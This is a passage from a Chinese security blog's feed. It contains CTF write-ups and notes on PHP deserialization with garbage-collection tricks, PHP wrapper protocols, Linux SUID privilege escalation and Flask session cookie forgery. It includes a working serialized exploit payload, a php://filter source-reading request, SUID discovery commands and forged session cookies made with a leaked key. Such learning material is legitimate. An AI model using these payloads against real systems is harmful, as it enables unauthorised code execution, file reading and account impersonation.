href="https://xz.aliyun.com/t/16227?time__1311=GuD=PRxGrh8D/WNiQGkDuQrKj8DmE+bD#toc-7">https://xz.aliyun.com/t/16227?time__1311=GuD%3DPRxGrh8D%2FWNiQGkDuQrKj8DmE%2BbD#toc-7</a></p><p>自己暂时还不会构造 然后 可以得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Learnd From: &lt;a href=&quot;https://goodapple.top/archives/1069&quot;&gt;https://goodapple.top/archives/1069&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;什么是Pickle？&quot;&gt;&lt;a href=&quot;#什么是P</summary>
      
    
    
    
    <category term="unserialize" scheme="https://gu0f3n.github.io/categories/unserialize/"/>
    
    
    <category term="unserialize" scheme="https://gu0f3n.github.io/tags/unserialize/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化 + GC回收机制</title>
    <link href="https://gu0f3n.github.io/2024/11/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/"/>
    <id>https://gu0f3n.github.io/2024/11/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/</id>
    <published>2024-11-16T04:53:24.000Z</published>
    <updated>2024-11-16T06:33:50.011Z</updated>
    
    <content type="html"><![CDATA[<p>f 复现的时候gc回收机制发现不会 写出来当笔记了</p><p>学习from：<a href="https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem=QaqiI3Y5p2GbD">https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem%3DQaqiI3Y5p2GbD</a></p><p>直接拿isctf的题目来进行练习</p><h2 id="天命人"><a href="#天命人" class="headerlink" title="天命人"></a>天命人</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">\<span class="comment"># 帮天命人搜集法宝，重获齐天之姿！</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wuzhishan</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$wu</span>=<span class="string">&quot;俺老孙定要踏破这五指山！&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$zhi</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$shan</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$j</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;此地阴阳二气略显虚浮，加上刚刚带入的阳气，或可借此遁逃！&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$yin</span>=<span class="string">&quot;s214587387a&quot;</span>;</span><br><span class="line">    <span class="variable">$yang</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;J&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$yin</span>)==<span class="variable">$yang</span>&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$yin</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$yang</span>))&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;哦？又一个不信天命之人？行了，拿了东西速速离开吧&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Huoyanjinjing</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$huoyan</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$jinjing</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$huo</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;huoyan=<span class="string">&quot;火眼能洞察一切邪祟！&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;huoyan-&gt;jinjing;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;jinjing=<span class="string">&quot;金睛能看破世间迷惘！&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;huoyan-&gt;jinjing;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dinghaishenzhen</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$Jindou</span>=<span class="string">&quot;一个筋斗能翻十万八千里！&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$yun</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable">$f</span>=<span class="variable language_">$this</span>-&gt;yun;</span><br><span class="line">    <span class="variable">$f</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;你真的逃出去了吗？天命人？&lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jingdouyun</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$Qishier</span>=<span class="number">72</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$bian</span>=<span class="string">&quot;看俺老孙七十二变！&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;三更敲门，菩提老祖送我筋斗云...&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">new</span> <span class="title class_">Jindouyun</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tianmingren</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$tianming</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$ren</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;迷途中的羔羊，你相信天命吗？&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;tianming;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Wukong&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;开局一根棍，装备全靠打。&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>就是gc回收机制加上反序列化</p><p>链子很简单</p><p>直接上exp了</p><?phperror_reporting(0);# 帮天命人搜集法宝，重获齐天之姿！<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wuzhishan</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$zhi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shan</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Huoyanjinjing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huoyan</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$jinjing</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dinghaishenzhen</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Jindou</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yun</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tianmingren</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tianming</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ren</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Tianmingren</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;tianming=<span class="keyword">new</span> <span class="title class_">Dinghaishenzhen</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;tianming-&gt;yun= <span class="keyword">new</span> <span class="title class_">Huoyanjinjing</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;tianming-&gt;yun-&gt;huoyan= <span class="keyword">new</span> <span class="title class_">Wuzhishan</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="variable">$a</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>因为这里还存在md5的绕过 直接让J=0e215962017最后因为还要绕过异常处理 所以我们直接反序列化一个数组 让第二个索引为0 即可绕过payload<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:?J=0e215962017</span><br><span class="line"></span><br><span class="line">POST=Wukong=a:2:&#123;i:0;O:11:&quot;Tianmingren&quot;:2:&#123;s:8:&quot;tianming&quot;;O:15:&quot;Dinghaishenzhen&quot;:2:&#123;s:6:&quot;Jindou&quot;;N;s:3:&quot;yun&quot;;O:13:&quot;Huoyanjinjing&quot;:2:&#123;s:6:&quot;huoyan&quot;;O:9:&quot;Wuzhishan&quot;:3:&#123;s:2:&quot;wu&quot;;N;s:3:&quot;zhi&quot;;N;s:4:&quot;shan&quot;;N;&#125;s:7:&quot;jinjing&quot;;N;&#125;&#125;s:3:&quot;ren&quot;;N;&#125;i:0;i:0;&#125;</span><br></pre></td></tr></table></figure>### CTFSHOW卷王杯[easy unserialize]]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;f 复现的时候gc回收机制发现不会 写出来当笔记了&lt;/p&gt;
&lt;p&gt;学习from：&lt;a href=&quot;https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem=QaqiI3Y5p2GbD&quot;&gt;https://xz.ali</summary>
      
    
    
    
    <category term="unserialize" scheme="https://gu0f3n.github.io/categories/unserialize/"/>
    
    
    <category term="unserialize" scheme="https://gu0f3n.github.io/tags/unserialize/"/>
    
  </entry>
  
  <entry>
    <title>php 伪协议</title>
    <link href="https://gu0f3n.github.io/2024/11/16/php-%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>https://gu0f3n.github.io/2024/11/16/php-%E4%BC%AA%E5%8D%8F%E8%AE%AE/</id>
    <published>2024-11-16T03:37:49.000Z</published>
    <updated>2024-11-16T03:44:55.925Z</updated>
    
    <content type="html"><![CDATA[<p>首先来看一下有哪些文件包含函数：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Copyinclude、<span class="keyword">require</span>、<span class="keyword">include_once</span>、<span class="keyword">require_once</span>、highlight_file</span><br><span class="line">show_source 、readfile 、file_get_contents 、fopen 、file</span><br></pre></td></tr></table></figure><p>有哪些伪协议：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">Copyfile:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line">http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line">ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line">php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line">zlib:<span class="comment">// — 压缩流</span></span><br><span class="line"><span class="keyword">data</span>:<span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line">glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line">phar:<span class="comment">// — PHP 归档</span></span><br><span class="line">ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line">rar:<span class="comment">// — RAR</span></span><br><span class="line">ogg:<span class="comment">// — 音频流</span></span><br><span class="line"><span class="keyword">expect</span>:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure><h4 id="2-1-php-filter"><a href="#2-1-php-filter" class="headerlink" title="2.1 php:&#x2F;&#x2F;filter"></a>2.1 php:&#x2F;&#x2F;filter</h4><p>php:&#x2F;&#x2F;filter用于读取源码，php:&#x2F;&#x2F;input用于执行php代码</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Copy?page=php://filter/read=convert.base64-encode/resource=../flag.php</span><br></pre></td></tr></table></figure><h4 id="2-2-file-协议"><a href="#2-2-file-协议" class="headerlink" title="2.2 file:&#x2F;&#x2F;协议"></a>2.2 file:&#x2F;&#x2F;协议</h4><p>用于访问本地文件系统，不受allow_url_fopen与allow_url_include的影响</p><p>即file:&#x2F;&#x2F; [文件的绝对路径和文件名]</p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">Copy?path=file:<span class="regexp">//</span><span class="regexp">/var/</span>www/html/flag.txt</span><br></pre></td></tr></table></figure><h4 id="2-3-php-input"><a href="#2-3-php-input" class="headerlink" title="2.3 php:&#x2F;&#x2F;input"></a>2.3 php:&#x2F;&#x2F;input</h4><p>php:&#x2F;&#x2F;input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行</p><p>php:&#x2F;&#x2F;input 可以用来生成一句话</p><p>利用该方法，我们可以直接写入php文件，输入file&#x3D;php:&#x2F;&#x2F;input，然后使用burp抓包，写入php代码：</p><h4 id="2-4-data-协议"><a href="#2-4-data-协议" class="headerlink" title="2.4 data:&#x2F;&#x2F;协议"></a>2.4 data:&#x2F;&#x2F;协议</h4><p>利用data:&#x2F;&#x2F; 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数：</p><h4 id="2-5-zip-bzip2-zlib-协议"><a href="#2-5-zip-bzip2-zlib-协议" class="headerlink" title="2.5 zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议"></a>2.5 zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议</h4><p>zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F; 均属于压缩流，可以访问压缩文件中的子文件，不需要指定后缀名</p><p>如果网站允许我们上传压缩文件，我们也可以将php文件压缩后进行上传，再通过zip:&#x2F;&#x2F;协议执行。</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1731728678644.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先来看一下有哪些文件包含函数：&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Copyinclude、&lt;span class=&quot;keyword&quot;&gt;</summary>
      
    
    
    
    <category term="php" scheme="https://gu0f3n.github.io/categories/php/"/>
    
    
    <category term="php" scheme="https://gu0f3n.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>suid提权</title>
    <link href="https://gu0f3n.github.io/2024/11/14/suid%E6%8F%90%E6%9D%83/"/>
    <id>https://gu0f3n.github.io/2024/11/14/suid%E6%8F%90%E6%9D%83/</id>
    <published>2024-11-14T07:22:27.000Z</published>
    <updated>2024-11-14T07:40:10.439Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux-suid提权"><a href="#Linux-suid提权" class="headerlink" title="Linux suid提权"></a>Linux suid提权</h1><h2 id="什么是suid"><a href="#什么是suid" class="headerlink" title="什么是suid"></a>什么是suid</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">suid(set uid)是linux中的一种特殊权限，suid可以让调用者以文件拥有者身份运行该文件，所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。</span><br></pre></td></tr></table></figure><p>在Linux操作系统中，为了有效管理和维护用户及用户组的安全性和权限控制，系统引入了三个关键配置文件来存储相关信息：</p><ul><li><code>/etc/passwd</code>：此文件存储了系统中所有用户的基本信息，包括但不限于用户名、用户ID（UID）、默认组ID（GID）、用户描述、家目录路径以及登录Shell等。</li><li><code>/etc/shadow</code>：为了增强安全性，实际的用户密码哈希值被存储在这个文件中，而不是在 <code>/etc/passwd</code> 中公开可见。只有具有适当权限的进程才能读取此文件。</li><li><code>/etc/group</code>：该文件记录了系统中各个用户组的信息，包括组名、组密码（很少使用）、组ID（GID）以及属于该组的成员列表。</li></ul><p>每个文件系统中的文件都包含了与用户和组相关的元数据，这些信息定义了文件的所有权和访问权限。具体来说，每个文件的文件头（inode）中都会记录文件的所有者（用户）和所属组，以及相应的读、写、执行权限。</p><p>关于 <code>/etc/passwd</code> 文件的格式，每一行代表一个用户，由七个字段组成，各字段之间用冒号（:）分隔：</p><ol><li><strong>用户名</strong>（User Name）：这是用户登录系统时使用的名称。</li><li><strong>密码占位符</strong>（Password Placeholder）：早期版本的 Linux 系统中，这里会直接存储加密后的密码，但现在通常只是一个占位符（如 <code>x</code> 或 <code>*</code>），实际密码被安全地存储在 <code>/etc/shadow</code> 中。</li><li><strong>用户ID（UID）</strong>：每个用户在系统中都有一个唯一的数字标识符。</li><li><strong>主组ID（GID）</strong>：用户所属的主要用户组的ID。</li><li><strong>用户描述</strong>（User Description）：也称为 GECOS 字段，通常包含用户的全名、办公室号码、电话等信息。</li><li><strong>家目录</strong>（Home Directory）：用户登录后的工作目录路径。</li><li><strong>登录Shell</strong>（Login Shell）：用户登录时启动的命令解释器。例如，<code>/bin/bash</code> 表示使用 Bash shell，而 <code>/sbin/nologin</code> 则表示该账户不允许登录。</li></ol><p>通过这样的设计，Linux 系统能够实现细粒度的权限控制，确保系统的稳定性和安全性，同时也为管理员提供了强大的工具来管理用户和资源。</p><p>example:</p><p>root:x:0:0:root:&#x2F;root:&#x2F;usr&#x2F;bin&#x2F;zsh<br>daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin<br>bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</p><p>在Linux系统中，SUID（Set User ID）是一种特殊的文件权限位，允许普通用户在执行特定程序时临时获得该程序文件所有者的权限。这一机制在某些情况下非常有用，比如允许非特权用户执行需要更高权限的操作。然而，不当使用SUID权限可能会带来严重的安全风险，因此在系统管理和安全加固过程中需要特别谨慎。</p><h3 id="SUID权限详解"><a href="#SUID权限详解" class="headerlink" title="SUID权限详解"></a>SUID权限详解</h3><h4 id="定义与作用"><a href="#定义与作用" class="headerlink" title="定义与作用"></a>定义与作用</h4><p>SUID权限允许一个可执行文件在其运行期间，使执行该文件的进程拥有文件所有者的权限，而不是执行者的权限。这意味着，如果一个文件的所有者是 <code>root</code> 并且设置了SUID位，那么任何用户在执行该文件时，都将获得 <code>root</code> 用户的权限。</p><h4 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h4><p>在Linux中，可以通过以下命令设置SUID位：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+s /path/to/file</span><br></pre></td></tr></table></figure><p>这会在文件权限的用户执行位上添加一个 <code>s</code>，表示设置了SUID位。例如，一个文件的权限可能显示为 <code>-rwsr-xr-x</code>，其中 <code>s</code> 表示SUID位已设置。</p><h4 id="安全风险"><a href="#安全风险" class="headerlink" title="安全风险"></a>安全风险</h4><p>虽然SUID位在某些场景下非常有用，但它也带来了潜在的安全风险。如果一个文件设置了SUID位并且存在漏洞，攻击者可能会利用这些漏洞提升自己的权限。例如，如果一个普通用户的UID被修改为0（即 <code>root</code> 用户的UID），那么该用户登录系统时将自动获得 <code>root</code> 权限，这显然是非常危险的。</p><h1 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h1><p>在系统加固过程中，应采取以下措施来减少SUID带来的安全风险：</p><ol><li><p><strong>定期审计</strong>：</p><ul><li>使用 <code>find</code> 命令查找所有设置了SUID位的文件：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f</span><br></pre></td></tr></table></figure></li><li>检查这些文件是否必要设置SUID位，如果不是，则移除SUID位：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u-s /path/to/file</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>最小权限原则</strong>：</p><ul><li>确保只有必要的文件才设置SUID位，避免不必要的权限提升。</li><li>对于必须设置SUID位的文件，确保其代码经过严格的安全审查，没有已知漏洞。</li></ul></li><li><p><strong>用户管理</strong>：</p><ul><li>确保没有普通用户的UID被设置为0。可以通过以下命令检查：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk -F: <span class="string">&#x27;($3 == 0) &#123;print $1&#125;&#x27;</span> /etc/passwd</span><br></pre></td></tr></table></figure></li><li>如果发现有非 <code>root</code> 用户的UID为0，立即修改其UID。</li></ul></li><li><p><strong>日志监控</strong>：</p><ul><li>启用并配置系统日志，监控SUID文件的执行情况，及时发现异常行为。</li></ul></li></ol><p>通过上述措施，可以有效地管理和控制SUID权限，减少潜在的安全风险，确保系统的稳定性和安全性。</p><p>具有suid权限的二进制可执行文件有：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap vim find bash more less nano cp awk</span><br></pre></td></tr></table></figure><p>相关命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><ul><li><pre><code>**1. `find**``find` 是一个强大的命令行工具，用于在文件系统中搜索文件和目录。它可以根据各种条件（如文件名、大小、权限等）来查找文件。2. `/``/` 表示从文件系统的根目录开始搜索。也就是说，`find` 会从系统的最顶层开始，递归地搜索所有子目录。3. `-perm -u=s``-perm` 选项用于指定要查找的文件权限。这里的 `-u=s` 表示查找具有SUID权限的文件。- `-u` 表示用户（user）权限。- `=s` 表示SUID位已设置。4. `-type f``-type` 选项用于指定要查找的文件类型。这里的 `f` 表示查找常规文件，而不是目录或其他特殊类型的文件。- `f` 表示普通文件。- 其他常见类型包括 `d`（目录）、`l`（符号链接）、`c`（字符设备）等。5. `2&gt;/dev/null`这部分用于处理命令执行过程中产生的错误信息。- `2` 表示标准错误输出（stderr），它是进程的第二个文件描述符。- `&gt;` 表示重定向操作符，用于将某个输出重定向到另一个地方。- `/dev/null` 是一个特殊的文件，任何写入它的内容都会被丢弃。这里的作用是忽略 `find` 命令执行过程中产生的错误信息，使其不会显示在终端上。</code></pre><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1731569964890.png"></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux-suid提权&quot;&gt;&lt;a href=&quot;#Linux-suid提权&quot; class=&quot;headerlink&quot; title=&quot;Linux suid提权&quot;&gt;&lt;/a&gt;Linux suid提权&lt;/h1&gt;&lt;h2 id=&quot;什么是suid&quot;&gt;&lt;a href=&quot;#什么是sui</summary>
      
    
    
    
    <category term="提权" scheme="https://gu0f3n.github.io/categories/%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="提权" scheme="https://gu0f3n.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>session伪造</title>
    <link href="https://gu0f3n.github.io/2024/11/14/session%E4%BC%AA%E9%80%A0/"/>
    <id>https://gu0f3n.github.io/2024/11/14/session%E4%BC%AA%E9%80%A0/</id>
    <published>2024-11-14T04:35:29.000Z</published>
    <updated>2024-11-19T03:06:45.479Z</updated>
    
    <content type="html"><![CDATA[<h2 id="flask的session伪造"><a href="#flask的session伪造" class="headerlink" title="flask的session伪造"></a>flask的session伪造</h2><h3 id="1-sessiond作用"><a href="#1-sessiond作用" class="headerlink" title="1.sessiond作用"></a>1.sessiond作用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由于http协议是一个无状态的协议，也就是说同一个用户第一次请求和第二次请求是完全没有关系的，但是现在的网站基本上有登录使用的功能，这就要求必须实现有状态，而session机制实现的就是这个功能。</span><br><span class="line">用户第一次请求后，将产生的状态信息保存在session中，这时可以把session当做一个容器，它保存了正在使用的所有用户的状态信息；这段状态信息分配了一个唯一的标识符用来标识用户的身份，将其保存在响应对象的cookie中；当第二次请求时，解析cookie中的标识符，拿到标识符后去session找到对应的用户的信息</span><br></pre></td></tr></table></figure><h3 id="2-flask-session的储存方式"><a href="#2-flask-session的储存方式" class="headerlink" title="2.flask session的储存方式"></a>2.flask session的储存方式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一种方式：直接存在客户端的cookies中</span><br><span class="line"></span><br><span class="line">第二种方式：存储在服务端，如：redis,memcached,mysql，file,mongodb等等，存在flask-session第三方库</span><br><span class="line"></span><br><span class="line">flask的session可以保存在客户端的cookie中，那么就会产生一定的安全问题。</span><br></pre></td></tr></table></figure><h3 id="3-flask的session格式"><a href="#3-flask的session格式" class="headerlink" title="3.flask的session格式"></a>3.flask的session格式</h3><p>flask的session格式一般是由base64加密的Session数据(经过了json、zlib压缩处理的字符串) . 时间戳 . 签名组成的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Y48ncA.H99Th2w4FzzphEX8qAeiSPuUF_0</span><br><span class="line">session数据                                     时间戳       签名               </span><br></pre></td></tr></table></figure><p>时间戳：用来告诉服务端数据最后一次更新的时间，超过31天的会话，将会过期，变为无效会话；</p><p>签名：是利用<code>Hmac</code>算法，将session数据和时间戳加上<code>secret_key</code>加密而成的，用来保证数据没有被修改。</p><h3 id="4、flask-session伪造"><a href="#4、flask-session伪造" class="headerlink" title="4、flask session伪造"></a>4、flask session伪造</h3><p>上面我们说到flask session是利用hmac算法将session数据，时间戳加上secert_key成的，那么我们要进行session伪造就要先得到secret_key，当我们得到secret_key我们就可以很轻松的进行session伪造。</p><p>session伪造工具：<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><h2 id="ISCTF2024【小蓝鲨的故事】"><a href="#ISCTF2024【小蓝鲨的故事】" class="headerlink" title="ISCTF2024【小蓝鲨的故事】"></a>ISCTF2024【小蓝鲨的故事】</h2><p>就是一个简单的session伪造 </p><p>页面就是一个简单的重定向</p><p>然后用dirsearch 扫描发现两个&#x2F;robots.txt &#x2F;flag</p><p>直接进入&#x2F;flag 发现是进不去的 &#x2F;robots.txt 可以发现 有东西 结合提示 发现这就是key </p><p>那么 &#x2F;flag 可以看到cookie 存储的是session</p><p>key:SAVPiEkH</p><p>cookie:eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.ZzrK2w.LGOmPBs5fB1pWbP-U5MABqrwxAw</p><p>我们利用flask-session-cookie-manager</p><p>先将 这段session 解码 发现</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c &#x27;eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.ZzrK2w.LGOmPBs5fB1pWbP-U5MABqrwxAw&#x27; -s &#x27;SAVPiEkH&#x27;</span><br><span class="line"></span><br><span class="line">&#123;&#x27;username&#x27;: b&#x27;www-data&#x27;&#125;</span><br></pre></td></tr></table></figure><p>得到{‘username’: b’www-data’}</p><p>但是不知道要怎么伪造成什么   admin  root 都试过了当时做题卡在这 </p><p>最后看wp 发现有一个&#x2F;Hacker</p><p>显示他叫ISctf_Hacker</p><p>。。dirsearch 没有这个字典 (｡･∀･)ﾉﾞ嗨</p><p>我们伪造成ISctf_Hacker 即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s&#x27;SAVPiEkH&#x27; -t &quot;&#123;&#x27;username&#x27;: b&#x27;ISctf_Hacker&#x27;&#125;&quot;</span><br><span class="line">eyJ1c2VybmFtZSI6eyIgYiI6IlNWTmpkR1pmU0dGamEyVnkifX0.ZzrMVA.NdDmowaV2YVPWJfUjnsAR6DDrfc</span><br></pre></td></tr></table></figure><p>eyJ1c2VybmFtZSI6eyIgYiI6IlNWTmpkR1pmU0dGamEyVnkifX0.ZzrMVA.NdDmowaV2YVPWJfUjnsAR6DDrfc</p><p>将这个传入 &#x2F;flag 的cookie 得到flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 